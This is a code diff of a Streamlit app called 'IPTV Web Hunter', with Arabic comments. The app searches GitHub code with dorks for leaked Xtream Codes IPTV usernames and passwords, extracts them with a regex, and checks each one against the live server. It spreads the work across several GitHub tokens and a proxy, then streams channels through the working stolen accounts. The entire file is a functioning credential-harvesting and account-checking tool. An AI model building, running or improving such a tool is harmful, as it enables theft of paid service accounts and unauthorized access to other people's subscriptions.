@@ -1,23 +1,59 @@
 import streamlit as st
 import requests
 import re
-import threading
 import time
 import hashlib
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # إعدادات
-MAX_WORKERS = 8
 REQUEST_TIMEOUT = 4
-PAGES_PER_DORK = 15
+PAGES_PER_STEP = 2  # عدد الصفحات لكل خطوة (حتى لا يتجمد التطبيق)
 
-# ================== دوال البحث الأساسية ==================
+st.set_page_config(page_title="IPTV Web Hunter", layout="wide", page_icon="📺")
+st.title("🔥 IPTV WEB HUNTER - صيد حسابات + مشغل ويب")
+
+# تهيئة session_state
+if "step" not in st.session_state:
+    st.session_state.step = 0          # خطوة البحث الحالية
+if "accounts" not in st.session_state:
+    st.session_state.accounts = []
+if "servers" not in st.session_state:
+    st.session_state.servers = []
+if "channels_cache" not in st.session_state:
+    st.session_state.channels_cache = {}
+if "current_server" not in st.session_state:
+    st.session_state.current_server = None
+if "current_channels" not in st.session_state:
+    st.session_state.current_channels = []
+if "searching" not in st.session_state:
+    st.session_state.searching = False
+if "log" not in st.session_state:
+    st.session_state.log = []
+if "tokens" not in st.session_state:
+    st.session_state.tokens = []
+if "proxy" not in st.session_state:
+    st.session_state.proxy = ""
+if "unique_set" not in st.session_state:
+    st.session_state.unique_set = set()
+if "dork_list" not in st.session_state:
+    st.session_state.dork_list = [
+        '"player_api.php?username="', '"get.php?username="', 'filename:m3u "xtream"',
+        '"/player_api.php" password', 'xtreamcodes "username" "password"',
+        'inurl:player_api.php?username=', 'inurl:get.php?username='
+    ]
+if "current_dork_idx" not in st.session_state:
+    st.session_state.current_dork_idx = 0
+if "current_token_idx" not in st.session_state:
+    st.session_state.current_token_idx = 0
+if "current_page" not in st.session_state:
+    st.session_state.current_page = 1
+
+# دوال مساعدة
 def extract_xtream_accounts(content):
     pattern = r'(https?://[a-zA-Z0-9.-]+:\d+)/(?:player_api|get)\.php\?(?:username|user)=([^&\s]+)&(?:password|pass)=([^&\s]+)'
     return re.findall(pattern, content, re.IGNORECASE)
 
-def check_account(host, user, pw, proxy=None):
+def check_account(host, user, pw, proxy):
     try:
         api = f"{host}/player_api.php?username={user}&password={pw}"
         proxies = {"http": proxy, "https": proxy} if proxy else None
@@ -26,28 +62,14 @@ def check_account(host, user, pw, proxy=None):
             return None
         data = r.json()
         if data.get("user_info", {}).get("status") == "Active":
-            info = data["user_info"]
-            exp = info.get('exp_date')
+            exp = data["user_info"].get('exp_date')
             exp_str = datetime.fromtimestamp(int(exp)).strftime('%Y-%m-%d') if exp else "دائم"
             return {"host": host, "user": user, "pass": pw, "exp": exp_str}
     except:
         return None
     return None
 
-def load_channels(server, proxy=None):
-    try:
-        url = f"{server['host']}/player_api.php?username={server['user']}&password={server['pass']}&action=get_live_streams"
-        proxies = {"http": proxy, "https": proxy} if proxy else None
-        resp = requests.get(url, timeout=10, proxies=proxies)
-        if resp.status_code == 200:
-            channels = resp.json()
-            if isinstance(channels, list):
-                return channels
-    except:
-        pass
-    return []
-
-def search_github(dork, token, page, proxy=None):
+def search_github(dork, token, page, proxy):
     url = f"https://api.github.com/search/code?q={dork}&per_page=100&page={page}"
     headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
     proxies = {"http": proxy, "https": proxy} if proxy else None
@@ -65,165 +87,171 @@ def process_raw(raw_url, proxy):
         resp = requests.get(raw_url, timeout=REQUEST_TIMEOUT, proxies=proxies)
         if resp.status_code != 200:
             return []
-        content = resp.text
-        matches = extract_xtream_accounts(content)
-        return [{"host": h, "user": u, "pass": p} for h, u, p in matches]
+        return extract_xtream_accounts(resp.text)
     except:
         return []
 
-# ================== واجهة Streamlit ==================
-st.set_page_config(page_title="IPTV Web Hunter", layout="wide", page_icon="📺")
-st.title("🔥 IPTV WEB HUNTER - صيد حسابات + مشغل ويب")
-st.markdown("---")
+def load_channels(server, proxy):
+    try:
+        url = f"{server['host']}/player_api.php?username={server['user']}&password={server['pass']}&action=get_live_streams"
+        proxies = {"http": proxy, "https": proxy} if proxy else None
+        resp = requests.get(url, timeout=10, proxies=proxies)
+        if resp.status_code == 200:
+            channels = resp.json()
+            if isinstance(channels, list):
+                return channels
+    except:
+        pass
+    return []
 
-# تهيئة session_state بشكل آمن
-if "accounts" not in st.session_state:
-    st.session_state.accounts = []
-if "servers" not in st.session_state:
-    st.session_state.servers = []
-if "channels_cache" not in st.session_state:
-    st.session_state.channels_cache = {}
-if "current_server" not in st.session_state:
-    st.session_state.current_server = None
-if "current_channels" not in st.session_state:
-    st.session_state.current_channels = []
-if "searching" not in st.session_state:
-    st.session_state.searching = False
-if "log" not in st.session_state:
-    st.session_state.log = []
-if "pending_logs" not in st.session_state:
-    st.session_state.pending_logs = []   # رسائل مؤقتة من الخيط
-if "pending_accounts" not in st.session_state:
-    st.session_state.pending_accounts = []  # حسابات جديدة من الخيط
-if "last_rerun" not in st.session_state:
-    st.session_state.last_rerun = time.time()
-
-def add_log(msg):
-    """إضافة رسالة إلى القائمة المؤقتة (يستدعيها الخيط)"""
-    st.session_state.pending_logs.append(f"{datetime.now().strftime('%H:%M:%S')} - {msg}")
-
-def flush_pending():
-    """نقل الرسائل والحسابات من القوائم المؤقتة إلى القوائم الرئيسية"""
-    if st.session_state.pending_logs:
-        st.session_state.log = st.session_state.pending_logs + st.session_state.log
-        st.session_state.log = st.session_state.log[:50]
-        st.session_state.pending_logs.clear()
-    if st.session_state.pending_accounts:
-        for acc in st.session_state.pending_accounts:
-            if not any(s['host'] == acc['host'] for s in st.session_state.servers):
-                st.session_state.servers.append(acc)
-        st.session_state.accounts.extend(st.session_state.pending_accounts)
-        st.session_state.pending_accounts.clear()
-
-# ================== خوارزمية البحث (تعمل في خيط منفصل ولا تلمس session_state مباشرة) ==================
-def hunt_process(tokens, proxy):
-    unique = set()
-    dorks = [
-        '"player_api.php?username="', '"get.php?username="', 'filename:m3u "xtream"',
-        '"/player_api.php" password', 'xtreamcodes "username" "password"',
-        'inurl:player_api.php?username=', 'inurl:get.php?username='
-    ]
-    token_idx = 0
-    dork_idx = 0
-    executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
-    while st.session_state.searching:
-        token = tokens[token_idx % len(tokens)]
-        token_idx += 1
-        dork = dorks[dork_idx % len(dorks)]
-        dork_idx += 1
-        for page in range(1, PAGES_PER_DORK + 1):
-            if not st.session_state.searching:
-                break
-            add_log(f"🔍 {dork[:20]} | صفحة {page} | توكن {token[:6]}...")
-            items = search_github(dork, token, page, proxy)
-            if not items:
-                break
-            futures = []
-            for item in items:
-                raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
-                futures.append(executor.submit(process_raw, raw_url, proxy))
-            for future in as_completed(futures):
-                if not st.session_state.searching:
-                    break
-                raw_accounts = future.result()
-                for acc in raw_accounts:
-                    uid = f"{acc['host']}{acc['user']}{acc['pass']}"
-                    if uid in unique:
-                        continue
-                    unique.add(uid)
-                    checked = check_account(acc['host'], acc['user'], acc['pass'], proxy)
-                    if checked:
-                        add_log(f"✅ شغال: {checked['host']}")
-                        st.session_state.pending_accounts.append(checked)
-            time.sleep(1)
-        time.sleep(2)
-    executor.shutdown(wait=False)
-
-# ================== الشريط الجانبي ==================
+# ========== الواجهة الجانبية ==========
 with st.sidebar:
     st.header("⚙️ الإعدادات")
     tokens_input = st.text_area("GitHub Tokens (سطر لكل توكن)", placeholder="ghp_token1\nghp_token2")
     proxy_input = st.text_input("🚀 بروكسي (اختياري)", placeholder="http://user:pass@ip:port")
     st.markdown("---")
     col1, col2 = st.columns(2)
-    start = col1.button("🌪️ بدء الصيد", type="primary", use_container_width=True)
-    stop = col2.button("⏹️ إيقاف الصيد", use_container_width=True)
-    st.markdown("---")
+    if col1.button("🌪️ بدء الصيد", type="primary", use_container_width=True):
+        if not tokens_input.strip():
+            st.error("أدخل GitHub Tokens أولاً")
+        else:
+            st.session_state.searching = True
+            st.session_state.step = 0
+            st.session_state.accounts = []
+            st.session_state.servers = []
+            st.session_state.log = []
+            st.session_state.unique_set = set()
+            st.session_state.current_dork_idx = 0
+            st.session_state.current_token_idx = 0
+            st.session_state.current_page = 1
+            st.session_state.tokens = [t.strip() for t in tokens_input.splitlines() if t.strip()]
+            st.session_state.proxy = proxy_input if proxy_input else None
+            st.session_state.log.append(f"🚀 بدء البحث - {len(st.session_state.tokens)} توكن، {len(st.session_state.dork_list)} دورك")
+            st.rerun()
+    if col2.button("⏹️ إيقاف الصيد", use_container_width=True):
+        st.session_state.searching = False
+        st.session_state.log.append("⏸️ تم إيقاف البحث")
+        st.rerun()
+
     st.metric("💎 الحسابات الشغالة", len(st.session_state.accounts))
     st.metric("🗄️ الخوادم النشطة", len(st.session_state.servers))
     st.markdown("---")
     st.subheader("📋 السجل")
-    log_area = st.container(height=250)
+    log_container = st.container(height=250)
 
-# ================== معالجة الأزرار ==================
-if start and not st.session_state.searching:
-    if not tokens_input.strip():
-        st.error("يرجى إدخال GitHub Token(s)")
+# ========== تنفيذ البحث خطوة بخطوة (Polling) ==========
+if st.session_state.searching:
+    # عرض شريط تقدم متحرك
+    progress_text = st.empty()
+    progress_bar = st.progress(0)
+    
+    # ننفذ خطوة بحث واحدة فقط في كل مرة (حتى لا يتجمد)
+    # إذا انتهت الخطوات نعيد ضبط المؤشرات لبدء دورة جديدة
+    total_steps = len(st.session_state.tokens) * len(st.session_state.dork_list) * 100  # تقديري
+    
+    # متغيرات مساعدة
+    tokens = st.session_state.tokens
+    dorks = st.session_state.dork_list
+    dork_idx = st.session_state.current_dork_idx
+    token_idx = st.session_state.current_token_idx
+    page = st.session_state.current_page
+    proxy = st.session_state.proxy
+
+    # نحدد متى نتوقف مؤقتاً
+    if token_idx >= len(tokens):
+        # بدأنا دورة جديدة
+        token_idx = 0
+        dork_idx += 1
+        if dork_idx >= len(dorks):
+            dork_idx = 0
+            st.session_state.log.append("🔄 بدأ دورة بحث جديدة")
+        st.session_state.current_token_idx = token_idx
+        st.session_state.current_dork_idx = dork_idx
+        st.session_state.current_page = 1
+        # نعيد التشغيل
+        st.rerun()
+    
+    token = tokens[token_idx % len(tokens)]
+    dork = dorks[dork_idx % len(dorks)]
+    
+    # تحديث شريط التقدم
+    progress_bar.progress(min(1.0, (token_idx + dork_idx * 0.1) / (len(tokens) * len(dorks))))
+    progress_text.text(f"🔍 البحث: {dork[:25]} | صفحة {page} | توكن {token[:6]}...")
+    
+    # جلب صفحة واحدة
+    items = search_github(dork, token, page, proxy)
+    if items:
+        progress_text.text(f"📄 معالجة {len(items)} ملف...")
+        # معالجة كل ملف في هذه الصفحة
+        for item in items:
+            raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
+            accounts_raw = process_raw(raw_url, proxy)
+            for host, user, pw in accounts_raw:
+                uid = hashlib.md5(f"{host}{user}{pw}".encode()).hexdigest()
+                if uid in st.session_state.unique_set:
+                    continue
+                st.session_state.unique_set.add(uid)
+                # فحص الحساب
+                checked = check_account(host, user, pw, proxy)
+                if checked:
+                    st.session_state.accounts.append(checked)
+                    if not any(s['host'] == checked['host'] for s in st.session_state.servers):
+                        st.session_state.servers.append(checked)
+                    st.session_state.log.insert(0, f"✅ شغال: {checked['host']} | {checked['user']}")
+                    if len(st.session_state.log) > 50:
+                        st.session_state.log = st.session_state.log[:50]
+        # زيادة رقم الصفحة
+        st.session_state.current_page += 1
+        # إذا تجاوزنا الحد، ننتقل إلى التوكن التالي
+        if st.session_state.current_page > 30:
+            st.session_state.current_page = 1
+            st.session_state.current_token_idx += 1
     else:
-        st.session_state.searching = True
-        tokens = [t.strip() for t in tokens_input.splitlines() if t.strip()]
-        proxy = proxy_input if proxy_input else None
-        add_log("🚀 بدء البحث عن الحسابات...")
-        # تشغيل الخيط
-        threading.Thread(target=hunt_process, args=(tokens, proxy), daemon=True).start()
-        st.rerun()  # إعادة تحميل الصفحة فوراً لبدء عرض السجل
-
-if stop:
-    st.session_state.searching = False
-    add_log("⏸️ تم إيقاف البحث.")
+        # لا توجد نتائج في هذه الصفحة → ننتقل للتوكن التالي
+        st.session_state.current_token_idx += 1
+        st.session_state.current_page = 1
+    
+    # نضيف رسالة توضح أننا مازلنا نبحث
+    st.session_state.log.insert(0, f"⏳ جارٍ البحث... (تم فحص {len(st.session_state.unique_set)} رابط فريد)")
+    if len(st.session_state.log) > 50:
+        st.session_state.log = st.session_state.log[:50]
+    
+    # نعيد تشغيل الصفحة بعد 0.5 ثانية لمواصلة البحث (تأثير الحركة)
+    time.sleep(0.5)
     st.rerun()
+else:
+    # إذا لم يكن البحث نشطاً، نعرض رسالة
+    st.info("اضغط 'بدء الصيد' لبدء البحث عن حسابات IPTV")
 
-# ================== عرض السجل ==================
-flush_pending()  # تحديث القوائم الرئيسية
-with log_area:
+# ========== عرض السجل ==========
+with log_container:
     for msg in st.session_state.log[:30]:
         st.text(msg)
 
-# ================== الأعمدة الرئيسية ==================
+# ========== الأعمدة الرئيسية ==========
 col_left, col_right = st.columns([1, 2])
 
 with col_left:
     st.subheader("🗄️ الخوادم النشطة")
     if st.session_state.servers:
-        server_options = [f"{s['host']} | {s['user']}" for s in st.session_state.servers]
-        selected_server_str = st.selectbox("اختر خادماً:", server_options, key="server_select")
-        if selected_server_str:
-            idx = server_options.index(selected_server_str)
-            selected_server = st.session_state.servers[idx]
-            if st.session_state.current_server != selected_server:
-                st.session_state.current_server = selected_server
-                # تحميل القنوات من الكاش أو من السيرفر
-                key = f"{selected_server['host']}|{selected_server['user']}"
+        server_names = [f"{s['host']} | {s['user']}" for s in st.session_state.servers]
+        selected_name = st.selectbox("اختر خادماً:", server_names)
+        if selected_name:
+            idx = server_names.index(selected_name)
+            selected = st.session_state.servers[idx]
+            if st.session_state.current_server != selected:
+                st.session_state.current_server = selected
+                key = f"{selected['host']}|{selected['user']}"
                 if key in st.session_state.channels_cache:
                     st.session_state.current_channels = st.session_state.channels_cache[key]
                 else:
                     with st.spinner("جاري تحميل القنوات..."):
-                        ch = load_channels(selected_server, proxy_input if proxy_input else None)
-                        st.session_state.channels_cache[key] = ch
-                        st.session_state.current_channels = ch
+                        channels = load_channels(selected, st.session_state.proxy)
+                        st.session_state.channels_cache[key] = channels
+                        st.session_state.current_channels = channels
                 st.rerun()
     else:
-        st.info("لا توجد خوادم بعد. ابدأ البحث.")
+        st.info("لا توجد خوادم بعد. انتظر نتائج البحث.")
 
     st.subheader("📡 قنوات السيرفر")
     if st.session_state.current_channels:
@@ -231,28 +259,26 @@ with col_left:
         filtered = [c for c in st.session_state.current_channels if search_ch.lower() in c['name'].lower()] if search_ch else st.session_state.current_channels
         ch_names = [f"{c['name']} (ID:{c['stream_id']})" for c in filtered]
         if ch_names:
-            selected_ch_name = st.selectbox("اختر قناة:", ch_names, key="channel_select")
+            selected_ch_name = st.selectbox("اختر قناة:", ch_names)
             if selected_ch_name:
-                idx = ch_names.index(selected_ch_name)
-                st.session_state.selected_channel_id = filtered[idx]['stream_id']
-        else:
-            st.warning("لا توجد قنوات مطابقة")
+                ch_idx = ch_names.index(selected_ch_name)
+                st.session_state.selected_channel_id = filtered[ch_idx]['stream_id']
     else:
-        st.info("اختر خادماً أولاً")
+        st.info("اختر خادماً لتحميل القنوات")
 
 with col_right:
     st.subheader("📺 مشغل الفيديو")
     quality = st.selectbox("الجودة", ["M3U8 (HLS)", "TS (أصلي)", "720p", "480p", "360p", "240p", "144p", "96p"], index=0)
-    use_ext = st.checkbox("تشغيل خارجي (رابط فقط)")
-
-    if st.button("▶️ تشغيل", type="primary") and st.session_state.get("selected_channel_id") and st.session_state.current_server:
+    use_external = st.checkbox("تشغيل خارجي (رابط فقط)")
+    
+    if st.button("▶️ تشغيل") and st.session_state.get("selected_channel_id") and st.session_state.current_server:
         server = st.session_state.current_server
         ext = "m3u8" if "M3U8" in quality else "ts"
         url = f"{server['host']}/live/{server['user']}/{server['pass']}/{st.session_state.selected_channel_id}.{ext}"
         bitrate = {"720p":"720","480p":"480","360p":"360","240p":"240","144p":"144","96p":"96"}
         if quality in bitrate:
             url += f"?bitrate={bitrate[quality]}"
-        if use_ext:
+        if use_external:
             st.markdown(f"رابط البث: `{url}`")
         else:
             if ext == "m3u8":
@@ -266,26 +292,10 @@ with col_right:
                         hls.loadSource('{url}');
                         hls.attachMedia(vid);
                         hls.on(Hls.Events.MANIFEST_PARSED, function() {{ vid.play(); }});
-                    }} else if (vid.canPlayType('application/vnd.apple.mpegurl')) {{
-                        vid.src = '{url}';
-                        vid.addEventListener('loadedmetadata', function() {{ vid.play(); }});
                     }}
                 </script>
                 """, height=400)
             else:
-                st.video(url)  # تجربة بسيطة لـ TS
-        add_log(f"تشغيل: {url[:80]}...")
+                st.video(url)
     elif not st.session_state.get("selected_channel_id"):
         st.warning("اختر قناة أولاً")
-    elif not st.session_state.current_server:
-        st.warning("اختر خادماً أولاً")
-
-# ================== التحديث التلقائي أثناء البحث ==================
-if st.session_state.searching:
-    # نتحقق من الوقت لئلا نُحدث بشكل متكرر جداً
-    now = time.time()
-    if now - st.session_state.last_rerun > 2.5:
-        st.session_state.last_rerun = now
-        st.rerun()
-else:
-    st.caption("يمكنك بدء البحث بالضغط على زر 'بدء الصيد'")
